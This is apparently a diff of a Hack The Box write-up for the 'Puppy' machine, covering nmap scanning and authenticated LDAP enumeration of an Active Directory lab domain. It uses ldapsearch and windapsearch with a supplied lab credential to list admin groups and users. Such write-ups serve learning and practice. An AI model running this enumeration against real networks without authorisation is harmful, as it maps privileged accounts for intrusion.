@@ -1,6 +1,6 @@
 # Puppy
 ## NMAP
-```py
+```bs
 ┌──(root㉿kali)-[/home/jacob/Desktop]
 └─# nmap -sV -sC -Pn 10.10.11.70                                                                                                                           
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-18 14:31 AEST
@@ -136,340 +136,6 @@ How about we try those handy credentials:
 └─# ldapsearch -x -H ldap://10.10.11.70 -D "levi.james@PUPPY.HTB" -w "KingofAkron2025!" -b "dc=PUPPY,dc=HTB"
 - Output far to large to copy here but there's a lot of info.
 ```
-Tried grepping the word 'admin' with context set to 1
-```py
-┌──(v-env)(root㉿kali)-[/home/jacob/Desktop/Boxes/Puppy/windapsearch]
-└─# ldapsearch -x -H ldap://10.10.11.70 -D "levi.james@PUPPY.HTB" -w "KingofAkron2025!" -b "dc=PUPPY,dc=HTB" | grep -i -C 1 admin
-
-# AdminSDHolder, System, PUPPY.HTB
-dn: CN=AdminSDHolder,CN=System,DC=PUPPY,DC=HTB
-objectClass: top
-objectClass: container
-cn: AdminSDHolder
-distinguishedName: CN=AdminSDHolder,CN=System,DC=PUPPY,DC=HTB
-instanceType: 4
---
-showInAdvancedViewOnly: TRUE
-name: AdminSDHolder
-objectGUID:: k7aHsM48YUK7uzf98Shx1g==
---
-
-# Administrator, Users, PUPPY.HTB
-dn: CN=Administrator,CN=Users,DC=PUPPY,DC=HTB
-objectClass: top
---
-objectClass: user
-cn: Administrator
-description: Built-in account for administering the computer/domain
-distinguishedName: CN=Administrator,CN=Users,DC=PUPPY,DC=HTB
-instanceType: 4
---
-memberOf: CN=Group Policy Creator Owners,CN=Users,DC=PUPPY,DC=HTB
-memberOf: CN=Domain Admins,CN=Users,DC=PUPPY,DC=HTB
-memberOf: CN=Enterprise Admins,CN=Users,DC=PUPPY,DC=HTB
-memberOf: CN=Schema Admins,CN=Users,DC=PUPPY,DC=HTB
-memberOf: CN=Administrators,CN=Builtin,DC=PUPPY,DC=HTB
-uSNChanged: 147540
-name: Administrator
-objectGUID:: dz7raIuZRUSHbobwIRQqfg==
---
-objectSid:: AQUAAAAAAAUVAAAAQ9CwWJ8ZBW3HmPiH9AEAAA==
-adminCount: 1
-accountExpires: 9223372036854775807
-logonCount: 103
-sAMAccountName: Administrator
-sAMAccountType: 805306368
---
-
-# Administrators, Builtin, PUPPY.HTB
-dn: CN=Administrators,CN=Builtin,DC=PUPPY,DC=HTB
-objectClass: top
-objectClass: group
-cn: Administrators
-description: Administrators have complete and unrestricted access to the compu
- ter/domain
-member: CN=Stephen A. Cooper_adm,OU=PUPPY ADMINS,DC=PUPPY,DC=HTB
-member: CN=Domain Admins,CN=Users,DC=PUPPY,DC=HTB
-member: CN=Enterprise Admins,CN=Users,DC=PUPPY,DC=HTB
-member: CN=Administrator,CN=Users,DC=PUPPY,DC=HTB
-distinguishedName: CN=Administrators,CN=Builtin,DC=PUPPY,DC=HTB
-instanceType: 4
---
-uSNChanged: 45139
-name: Administrators
-objectGUID:: yYAcjBJMd0i77HDE3kPxDA==
-objectSid:: AQIAAAAAAAUgAAAAIAIAAA==
-adminCount: 1
-sAMAccountName: Administrators
-sAMAccountType: 536870912
---
-cn: Print Operators
-description: Members can administer printers installed on domain controllers
-distinguishedName: CN=Print Operators,CN=Builtin,DC=PUPPY,DC=HTB
---
-objectSid:: AQIAAAAAAAUgAAAAJgIAAA==
-adminCount: 1
-sAMAccountName: Print Operators
---
-objectSid:: AQIAAAAAAAUgAAAAJwIAAA==
-adminCount: 1
-sAMAccountName: Backup Operators
---
-objectSid:: AQIAAAAAAAUgAAAAKAIAAA==
-adminCount: 1
-sAMAccountName: Replicator
---
-cn: Network Configuration Operators
-description: Members in this group can have some administrative privileges to 
- manage configuration of networking features
---
-cn: RDS Management Servers
-description: Servers in this group can perform routine administrative actions 
- on servers running Remote Desktop Services. This group needs to be populated 
---
-
-# Hyper-V Administrators, Builtin, PUPPY.HTB
-dn: CN=Hyper-V Administrators,CN=Builtin,DC=PUPPY,DC=HTB
-objectClass: top
-objectClass: group
-cn: Hyper-V Administrators
-description: Members of this group have complete and unrestricted access to al
- l features of Hyper-V.
-distinguishedName: CN=Hyper-V Administrators,CN=Builtin,DC=PUPPY,DC=HTB
-instanceType: 4
---
-uSNChanged: 8229
-name: Hyper-V Administrators
-objectGUID:: 63aTeCZY10GRvMWNBRxzZw==
-objectSid:: AQIAAAAAAAUgAAAAQgIAAA==
-sAMAccountName: Hyper-V Administrators
-sAMAccountType: 536870912
---
- is applies only to WMI namespaces that grant access to the user.
-member: CN=Stephen W. Cooper,OU=PUPPY ADMINS,DC=PUPPY,DC=HTB
-member: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
---
-
-# Storage Replica Administrators, Builtin, PUPPY.HTB
-dn: CN=Storage Replica Administrators,CN=Builtin,DC=PUPPY,DC=HTB
-objectClass: top
-objectClass: group
-cn: Storage Replica Administrators
-description: Members of this group have complete and unrestricted access to al
- l features of Storage Replica.
-distinguishedName: CN=Storage Replica Administrators,CN=Builtin,DC=PUPPY,DC=HT
- B
---
-uSNChanged: 8232
-name: Storage Replica Administrators
-objectGUID:: 54mKMy9Qhk6zOyrEpLg7PA==
-objectSid:: AQIAAAAAAAUgAAAARgIAAA==
-sAMAccountName: Storage Replica Administrators
-sAMAccountType: 536870912
---
-objectSid:: AQUAAAAAAAUVAAAAQ9CwWJ8ZBW3HmPiH9gEAAA==
-adminCount: 1
-accountExpires: 9223372036854775807
---
-sAMAccountType: 805306368
-servicePrincipalName: kadmin/changepw
-objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=PUPPY,DC=HTB
---
-objectSid:: AQUAAAAAAAUVAAAAQ9CwWJ8ZBW3HmPiHBAIAAA==
-adminCount: 1
-sAMAccountName: Domain Controllers
---
-
-# Schema Admins, Users, PUPPY.HTB
-dn: CN=Schema Admins,CN=Users,DC=PUPPY,DC=HTB
-objectClass: top
-objectClass: group
-cn: Schema Admins
-description: Designated administrators of the schema
-member: CN=Administrator,CN=Users,DC=PUPPY,DC=HTB
-distinguishedName: CN=Schema Admins,CN=Users,DC=PUPPY,DC=HTB
-instanceType: 4
---
-uSNChanged: 12775
-name: Schema Admins
-objectGUID:: +ZC7JiItOUeuy6Oqc9S6Ng==
-objectSid:: AQUAAAAAAAUVAAAAQ9CwWJ8ZBW3HmPiHBgIAAA==
-adminCount: 1
-sAMAccountName: Schema Admins
-sAMAccountType: 268435456
---
-
-# Enterprise Admins, Users, PUPPY.HTB
-dn: CN=Enterprise Admins,CN=Users,DC=PUPPY,DC=HTB
-objectClass: top
-objectClass: group
-cn: Enterprise Admins
-description: Designated administrators of the enterprise
-member: CN=Administrator,CN=Users,DC=PUPPY,DC=HTB
-distinguishedName: CN=Enterprise Admins,CN=Users,DC=PUPPY,DC=HTB
-instanceType: 4
---
-memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=PUPPY,DC=HTB
-memberOf: CN=Administrators,CN=Builtin,DC=PUPPY,DC=HTB
-uSNChanged: 12769
-name: Enterprise Admins
-objectGUID:: Ubm0KwjSA0uLAColHaIDSg==
-objectSid:: AQUAAAAAAAUVAAAAQ9CwWJ8ZBW3HmPiHBwIAAA==
-adminCount: 1
-sAMAccountName: Enterprise Admins
-sAMAccountType: 268435456
---
-
-# Domain Admins, Users, PUPPY.HTB
-dn: CN=Domain Admins,CN=Users,DC=PUPPY,DC=HTB
-objectClass: top
-objectClass: group
-cn: Domain Admins
-description: Designated administrators of the domain
-member: CN=Administrator,CN=Users,DC=PUPPY,DC=HTB
-distinguishedName: CN=Domain Admins,CN=Users,DC=PUPPY,DC=HTB
-instanceType: 4
---
-memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=PUPPY,DC=HTB
-memberOf: CN=Administrators,CN=Builtin,DC=PUPPY,DC=HTB
-uSNChanged: 12774
-name: Domain Admins
-objectGUID:: 48PriZzm6kKsowUrkuZOug==
-objectSid:: AQUAAAAAAAUVAAAAQ9CwWJ8ZBW3HmPiHAAIAAA==
-adminCount: 1
-sAMAccountName: Domain Admins
-sAMAccountType: 268435456
---
-description: Members in this group can modify group policy for the domain
-member: CN=Administrator,CN=Users,DC=PUPPY,DC=HTB
-distinguishedName: CN=Group Policy Creator Owners,CN=Users,DC=PUPPY,DC=HTB
---
-cn: Server Operators
-description: Members can administer domain servers
-distinguishedName: CN=Server Operators,CN=Builtin,DC=PUPPY,DC=HTB
---
-objectSid:: AQIAAAAAAAUgAAAAJQIAAA==
-adminCount: 1
-sAMAccountName: Server Operators
---
-cn: Account Operators
-description: Members can administer domain user and group accounts
-distinguishedName: CN=Account Operators,CN=Builtin,DC=PUPPY,DC=HTB
---
-objectSid:: AQIAAAAAAAUgAAAAJAIAAA==
-adminCount: 1
-sAMAccountName: Account Operators
---
-member: CN=Group Policy Creator Owners,CN=Users,DC=PUPPY,DC=HTB
-member: CN=Domain Admins,CN=Users,DC=PUPPY,DC=HTB
-member: CN=Cert Publishers,CN=Users,DC=PUPPY,DC=HTB
-member: CN=Enterprise Admins,CN=Users,DC=PUPPY,DC=HTB
-member: CN=Schema Admins,CN=Users,DC=PUPPY,DC=HTB
-member: CN=Domain Controllers,CN=Users,DC=PUPPY,DC=HTB
---
-objectSid:: AQUAAAAAAAUVAAAAQ9CwWJ8ZBW3HmPiHCQIAAA==
-adminCount: 1
-sAMAccountName: Read-only Domain Controllers
---
-
-# Key Admins, Users, PUPPY.HTB
-dn: CN=Key Admins,CN=Users,DC=PUPPY,DC=HTB
-objectClass: top
-objectClass: group
-cn: Key Admins
-description: Members of this group can perform administrative actions on key o
- bjects within the domain.
-distinguishedName: CN=Key Admins,CN=Users,DC=PUPPY,DC=HTB
-instanceType: 4
---
-uSNChanged: 12772
-name: Key Admins
-objectGUID:: krvpFbpgS0+EgAJG8sCSIQ==
-objectSid:: AQUAAAAAAAUVAAAAQ9CwWJ8ZBW3HmPiHDgIAAA==
-adminCount: 1
-sAMAccountName: Key Admins
-sAMAccountType: 268435456
---
-
-# Enterprise Key Admins, Users, PUPPY.HTB
-dn: CN=Enterprise Key Admins,CN=Users,DC=PUPPY,DC=HTB
-objectClass: top
-objectClass: group
-cn: Enterprise Key Admins
-description: Members of this group can perform administrative actions on key o
- bjects within the forest.
-distinguishedName: CN=Enterprise Key Admins,CN=Users,DC=PUPPY,DC=HTB
-instanceType: 4
---
-uSNChanged: 12773
-name: Enterprise Key Admins
-objectGUID:: vaym7QggzkalzYc2xril7w==
-objectSid:: AQUAAAAAAAUVAAAAQ9CwWJ8ZBW3HmPiHDwIAAA==
-adminCount: 1
-sAMAccountName: Enterprise Key Admins
-sAMAccountType: 268435456
---
-
-# DnsAdmins, Users, PUPPY.HTB
-dn: CN=DnsAdmins,CN=Users,DC=PUPPY,DC=HTB
-objectClass: top
-objectClass: group
-cn: DnsAdmins
-description: DNS Administrators Group
-distinguishedName: CN=DnsAdmins,CN=Users,DC=PUPPY,DC=HTB
-instanceType: 4
---
-uSNChanged: 12488
-name: DnsAdmins
-objectGUID:: 45QpVsa2ykKwxtGh1r5XGA==
-objectSid:: AQUAAAAAAAUVAAAAQ9CwWJ8ZBW3HmPiHTQQAAA==
-sAMAccountName: DnsAdmins
-sAMAccountType: 536870912
---
-objectSid:: AQUAAAAAAAUVAAAAQ9CwWJ8ZBW3HmPiHUQQAAA==
-adminCount: 1
-accountExpires: 9223372036854775807
---
-
-# PUPPY ADMINS, PUPPY.HTB
-dn: OU=PUPPY ADMINS,DC=PUPPY,DC=HTB
-objectClass: top
-objectClass: organizationalUnit
-ou: PUPPY ADMINS
-distinguishedName: OU=PUPPY ADMINS,DC=PUPPY,DC=HTB
-instanceType: 4
---
-uSNChanged: 12832
-name: PUPPY ADMINS
-objectGUID:: +TB2SYQs2kuP1EgSvIlrmQ==
---
-
-# Stephen W. Cooper, PUPPY ADMINS, PUPPY.HTB
-dn: CN=Stephen W. Cooper,OU=PUPPY ADMINS,DC=PUPPY,DC=HTB
-objectClass: top
---
-initials: W
-distinguishedName: CN=Stephen W. Cooper,OU=PUPPY ADMINS,DC=PUPPY,DC=HTB
-instanceType: 4
---
-
-# Stephen A. Cooper_adm, PUPPY ADMINS, PUPPY.HTB
-dn: CN=Stephen A. Cooper_adm,OU=PUPPY ADMINS,DC=PUPPY,DC=HTB
-objectClass: top
---
-initials: A
-distinguishedName: CN=Stephen A. Cooper_adm,OU=PUPPY ADMINS,DC=PUPPY,DC=HTB
-instanceType: 4
---
-uSNCreated: 45124
-memberOf: CN=Administrators,CN=Builtin,DC=PUPPY,DC=HTB
-uSNChanged: 94259
---
-objectSid:: AQUAAAAAAAUVAAAAQ9CwWJ8ZBW3HmPiHVwQAAA==
-adminCount: 1
-accountExpires: 9223372036854775807
-```
- - Greping for password didn't help much but we have Stephen A. Cooper in admins
  
 - IMPORTANT: Tried windapsearch.py with different flags but kept getting 'invalid credentials', windapsearch.py is super super fussy so make sure the syntax is correct - look at below carefully - same command but structured differently - but one with a slightly misleading error message:
 ```py
@@ -489,7 +155,6 @@ cn: DC
 operatingSystem: Windows Server 2022 Standard
 operatingSystemVersion: 10.0 (20348)
 dNSHostName: DC.PUPPY.HTB
-
 
 [*] Bye!
 
@@ -521,7 +186,7 @@ cn: Administrator
 [+] Using DN: CN=Domain Admins,CN=Users.CN=Domain Admins,CN=Users,DC=PUPPY,DC=HTB
 [+]     Found 1 Domain Admins:
 
-cn: Administrator
+cn: Administrator -------------------------------
 
 
 [*] Bye!
@@ -541,7 +206,7 @@ Asked windapsearch to enumerate all members of Administrators group
 
 [+]      Found 4 members:
 
-b'CN=Stephen A. Cooper_adm,OU=PUPPY ADMINS,DC=PUPPY,DC=HTB'
+b'CN=Stephen A. Cooper_adm,OU=PUPPY ADMINS,DC=PUPPY,DC=HTB' ---------------------------------
 b'CN=Domain Admins,CN=Users,DC=PUPPY,DC=HTB'
 b'CN=Enterprise Admins,CN=Users,DC=PUPPY,DC=HTB'
 b'CN=Administrator,CN=Users,DC=PUPPY,DC=HTB'
@@ -617,9 +282,50 @@ CN=Key Admins,CN=Users,DC=PUPPY,DC=HTB
 
 CN=Enterprise Key Admins,CN=Users,DC=PUPPY,DC=HTB
 
-CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
+CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB ----------------------------------------
 
-CN=Stephen A. Cooper_adm,OU=PUPPY ADMINS,DC=PUPPY,DC=HTB
+CN=Stephen A. Cooper_adm,OU=PUPPY ADMINS,DC=PUPPY,DC=HTB -----------------------------------
+
+
+[*] Bye!
+```
+- For users
+```py
+┌──(v-env)(root㉿kali)-[/home/jacob/Desktop/Boxes/Puppy/windapsearch]
+└─# python3 windapsearch.py --dc-ip 10.10.11.70 -u levi.james@PUPPY.HTB -p "KingofAkron2025!" --users
+[+] Using Domain Controller at: 10.10.11.70
+[+] Getting defaultNamingContext from Root DSE
+[+]     Found: DC=PUPPY,DC=HTB
+[+] Attempting bind
+[+]     ...success! Binded as: 
+[+]      u:PUPPY\levi.james
+
+[+] Enumerating all AD users
+[+]     Found 9 users: 
+
+cn: Administrator
+
+cn: Guest
+
+cn: krbtgt
+
+cn: Levi B. James
+userPrincipalName: levi.james@PUPPY.HTB
+
+cn: Anthony J. Edwards
+userPrincipalName: ant.edwards@PUPPY.HTB
+
+cn: Adam D. Silver
+userPrincipalName: adam.silver@PUPPY.HTB
+
+cn: Jamie S. Williams
+userPrincipalName: jamie.williams@PUPPY.HTB
+
+cn: Stephen W. Cooper
+userPrincipalName: steph.cooper@PUPPY.HTB
+
+cn: Stephen A. Cooper_adm
+userPrincipalName: steph.cooper_adm@PUPPY.HTB
 
 
 [*] Bye!
